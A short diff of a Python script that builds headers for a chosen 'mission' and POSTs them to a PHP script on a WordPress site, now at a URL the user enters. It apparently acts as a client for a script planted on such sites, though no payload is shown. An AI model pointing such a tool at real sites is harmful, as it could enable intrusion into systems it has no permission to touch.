@@ -22,7 +22,7 @@ cms_choice=int(input('Choose number: '))
 if cms_choice==1:
 	cms='wp'
 
-
+site=input('Input site and path to script: ')
 
 def genheader(mission, cms):
 	
@@ -39,7 +39,7 @@ headers=genheader(mission, cms)
 
 
 
-r=post('http://anti-scam-wp/wp-security.php', headers=headers)
+r=post(site, headers=headers)
 print(r.status_code)
 print(r.text)
 if mission_choice==1:
